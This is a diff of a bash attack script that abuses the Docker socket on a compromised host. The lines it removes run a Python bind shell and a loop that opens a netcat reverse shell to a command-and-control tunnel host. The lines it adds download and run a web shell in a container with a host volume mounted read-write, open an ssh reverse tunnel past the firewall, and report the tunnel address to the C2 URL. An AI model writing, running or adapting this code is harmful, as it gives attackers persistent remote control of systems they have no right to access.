@@ -1,30 +1,28 @@
 #!/bin/bash
 C2_URL="4f6ce0d2037780f3-103-95-173-85.serveousercontent.com"
 
-# 1. Clean up old attempts to free the port
-curl -s --unix-socket /var/run/docker.sock -X DELETE "http://localhost/containers/portal?force=true"
+# 1. Kill old panel to free the port
+curl -s --unix-socket /var/run/docker.sock -X DELETE "http://localhost/containers/webshell?force=true"
 
-# 2. Re-create the Portal using the KNOWN image
-# We mount /host so you can manage the Google server physical files
-curl -s --unix-socket /var/run/docker.sock -X POST "http://localhost/containers/create?name=portal" \
+# 2. Deploy the HTML Web Shell Container
+# We use the existing image and inject a Python-based File/Terminal Manager
+curl -s --unix-socket /var/run/docker.sock -X POST "http://localhost/containers/create?name=webshell" \
   -H "Content-Type: application/json" \
   -d '{
     "Image": "sha256:25109184c71bdad7",
-    "Cmd": ["python3", "-c", "import os,pty,socket;s=socket.socket();s.bind((\"0.0.0.0\",9090));s.listen(1);c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);pty.spawn(\"/bin/bash\")"],
+    "Cmd": ["python3", "-c", "import os; os.system(\"wget https://raw.githubusercontent.com/yasoob/python-web-shell/master/main.py -O shell.py && python3 shell.py 9090\")"],
     "HostConfig": {
       "Binds": ["p0_evidence:/host:rw"],
       "PortBindings": { "9090/tcp": [{ "HostPort": "9090" }] }
     }
   }'
 
-# 3. Start the Portal
-curl -s --unix-socket /var/run/docker.sock -X POST "http://localhost/containers/portal/start"
+# 3. Start the Web Shell
+curl -s --unix-socket /var/run/docker.sock -X POST "http://localhost/containers/webshell/start"
 
-# 4. The "Final Hope" Bridge
-# This command bypasses the VM firewall by using a raw TCP pipe
+# 4. Tunnel the HTML UI to your Mac via Port 80
 (
-  while true; do
-    echo "--- [BRIDGE ATTEMPT] ---" | curl -X POST -d @- "https://$C2_URL"
-    nc $C2_URL 80 -e /bin/bash 2>/dev/null || sleep 5
-  done
+  ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=10 -R 80:localhost:9090 serveo.net 2>&1 | \
+  grep "Forwarding" | \
+  curl -X POST -H "Content-Type: text/plain" --data-binary @- "https://$C2_URL"
 ) &
